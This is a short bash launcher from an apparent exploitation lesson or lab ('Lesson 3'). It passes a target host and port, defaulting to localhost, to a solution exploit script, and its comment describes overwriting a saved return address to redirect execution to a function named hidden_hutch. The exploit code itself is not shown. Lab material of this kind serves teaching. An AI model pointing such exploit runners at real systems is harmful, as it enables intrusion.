#!/usr/bin/env bash
# Lesson 3: overwrite the saved return address with hidden_hutch.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30004}"
python3 solution/exploit.py "$host" "$port" 3
